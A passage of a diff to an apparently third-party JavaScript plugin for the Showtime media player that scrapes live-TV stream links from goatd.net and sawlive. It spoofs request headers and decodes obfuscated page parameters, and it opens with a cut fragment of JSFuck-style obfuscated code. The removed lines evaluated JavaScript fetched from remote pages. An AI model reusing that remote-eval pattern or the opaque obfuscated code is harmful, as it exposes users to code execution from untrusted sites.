])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(![]+[+![]])[([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()[+!+[]+[+[]]])];
+RULhTbdULa(document[_0x3703[1]](_0x3704[1]))
 
-        function detect(str) {
-            return (get_chunks(str).length > 0);
-        }
-
-        function unpack_chunk(str) {
-            var unpacked_source = '';
-            var __eval = eval;
-            if (detect(str)) {
-                try {
-                    eval = function (s) { unpacked_source += s; return unpacked_source; };
-                    __eval(str);
-                    if (typeof unpacked_source == 'string' && unpacked_source) {
-                        str = unpacked_source;
-                    }
-                } catch (e) {
-                    // well, it failed. we'll just return the original, instead of crashing on user.
-               }
-            }
-            eval = __eval;
-            return str;
-        }
-
-        var chunks = get_chunks(str);
-        for(var i = 0; i < chunks.length; i++) {
-            chunk = chunks[i].replace(/\n$/, '');
-            str = str.split(chunk).join(unpack_chunk(chunk));
-        }
-        return str;
+        //eval(doc);
     }
 
     plugin.addURI(PREFIX + ":playgoAtDee:(.*):(.*)", function(page, url, title) {
@@ -1414,88 +1139,35 @@
         page.metadata.title = unescape(title);
         var link = null;
         var doc = showtime.httpReq('http://goatd.net/' + unescape(url)).toString();
-
-        // Try castalba
-        var match = doc.match(/id="([\s\S]*?)"; ew="/);
-        if (match) {
-            doc = showtime.httpReq('http://castalba.tv/embed.php?cid='+ match[1]).toString();
-            var streamer = doc.match(/'streamer':[\s\S]*?'([\s\S]*?)'/);
-            if (streamer) {
-                streamer = unescape(streamer[1]);
-            } else {
-                page.error('Stream is offline');
-                return;
-            }
-            var file = doc.match(/'file': ([\s\S]*?),/)[1];
-            file = unescape(unescape(file.replace(/[\'|\(|\)\+|unescape]/g, '')));
-            link = streamer + ' playpath=' + file + ' swfUrl=http://static.castalba.tv/player5.9.swf pageUrl=http://castalba.tv/embed.php?cid=' + match[1]
-        } else { // Sawlive
-            match = doc.match(/swidth=[\s\S]*?src="([\s\S]*?)"/); // extract pseudo link
-            showtime.print(match[1]);
-            if (match) { // get watch link from pseudo link
-                doc = showtime.httpReq(match[1], {
-                    headers: {
-                        Host: 'www.sawlive.tv',
+        match = doc.match(/swidth=[\s\S]*?src="([\s\S]*?)"/); // extract embed url
+        if (match) { 
+            log(match[1]);
+            doc = showtime.httpReq(match[1], { // loading document.write redirect page
+                headers: {
+                    Host: 'www.sawlive.tv',
                         Referer: 'http://goatd.net/' + unescape(url),
                         'User-Agent': UA
-                    }
-                }).toString();
-                if (doc.match(/y3s=/)) {
-                   var referer = 'http://sawlive.tv/embed/watch/' + doc.match(/y3s='([\s\S]*?)'/)[1] + '/' + doc.match(/za3='([\s\S]*?)'/)[1] // extract watch link
-                   if (!referer) {
-                       referer = doc.match(/swidth[\s\S]*?src="([\s\S]*?)"/); // extract watch link
-                       if (referer) referer = referer[1];
-                   }
                 }
-                if (referer) {
-                    doc = showtime.httpReq(referer, {
-                        headers: {
-                            Host: 'www.sawlive.tv',
-                            Referer: 'http://goatd.net/' + unescape(url),
-                           'User-Agent': UA
-                       }
-                    }).toString();
-                }
+            }).toString();
+            match = doc.match(/var[\s\S]*?"([\s\S]*?);([\s\S]*?)"/);
+            // fetching crypted html
+            var referer = 'http://www.sawlive.tv/embed/stream/' + match[2] + '/' + match[1];
+            doc = showtime.httpReq(referer, {
+                headers: {
+                    Host: 'www.sawlive.tv',
+                    Referer: 'http://goatd.net/' + unescape(url),
+                    'User-Agent': UA
+                }, debug: true
+            }).toString();
 
-                // try play directly
-                var streamer = doc.match(/'streamer', '([\s\S]*?)'/);
-                if (streamer) {
-                    var link = streamer[1] + ' playpath=' + doc.match(/'file', '([\s\S]*?)'/)[1] + ' swfUrl=http://static3.sawlive.tv/player.swf pageUrl=' + referer;
-                } else { // page is crypted
-                    link = doc.match(/'file', '([\s\S]*?)'/);
-                    if (link)
-                        link = link[1];
-                    else {
-                        var tmp = unescape(unpack(doc)).replace(/document\.write\(unescape\(\'/g, '').replace(/\'\)\);/g, '').replace(/\n/g, '');
-                        var referer = tmp.match(/src="([\s\S]*?)["|\']/)[1];
-                        try {
-                            doc = showtime.httpReq(referer, {
-                                headers: {
-                                    Host: 'www.sawlive.tv',
-                                    Referer: 'http://goatd.net/' + unescape(url),
-                                    'User-Agent': UA
-                                }
-                            }).toString();
-                            var streamer = doc.match(/'streamer', '([\s\S]*?)'/);
-                            if (streamer) {
-                                var link = streamer[1] + ' playpath=' + doc.match(/'file', '([\s\S]*?)'/)[1] + ' swfUrl=http://static3.sawlive.tv/player.swf pageUrl=' + referer;
-                            } else {
-                                doc = doc.match(/eval\(function([\S\s]*?)\}\((.*)/);
-                                if (doc) {
-                                    eval('try { function decryptParams' + doc[1] + '}; decodedStr = (decryptParams(' + doc[2] + '} catch (err) {}');
-                                    var streamer = decodedStr.match(/'streamer','([\s\S]*?)'/)[1];
-                                    var playpath = decodedStr.match(/'file','([\s\S]*?)'/)[1];
-                                    var link = streamer + ' playpath=' + playpath + ' swfUrl=http://static3.sawlive.tv/player.swf pageUrl=' + referer;
-                                }
-
-                            }
-                        } catch(err) {
-                            link = false;
-                        }
-                    }
-                }
+            // 1-streamer, 2-playpath
+            match = doc.match(/sowrite\("[\s\S]*?", "([\s\S]*?)", "([\s\S]*?)"/);
+            if (match) {
+                var playpath = match[1].replace('17264311', '').replace('11123346', '');
+                var link = match[2] + ' playpath=' + playpath + ' swfUrl=http://static3.sawlive.tv/player.swf pageUrl=' + referer;
             }
         }
+        page.loading = false;
         if (link) {
             link = "videoparams:" + showtime.JSONEncode({
                 title: unescape(title),
@@ -1509,8 +1181,7 @@
             page.type = 'video';
             page.source = link;
         } else
-            page.error('Can\'t get link :( Maybe stream is offline?');
-        page.loading = false;
+            page.error("Can't get the link :( Maybe stream is offline?");
     });
 
     plugin.addURI(PREFIX + ":goAtDeeStart", function(page) {
@@ -1590,17 +1261,14 @@
 	page.appendItem(PREFIX + ":streamliveStart", "directory", {
 	    title: "StreamLive.to"
 	});
-	//page.appendItem(PREFIX + ":divanStart", "directory", {
-	//    title: "Divan.tv"
-	//});
 	page.appendItem(PREFIX + ":tivixStart", "directory", {
 	    title: "Tivix.co"
+	});
+	page.appendItem(PREFIX + ":goAtDeeStart", "directory", {
+	    title: "goATDee.Net"
 	});
 	page.appendItem(PREFIX + ":idcStart", "directory", {
 	    title: "Idc.md"
 	});
-	//page.appendItem(PREFIX + ":goAtDeeStart", "directory", {
-	//    title: "goATDee.Net"
-	//});
     });
 })(this);
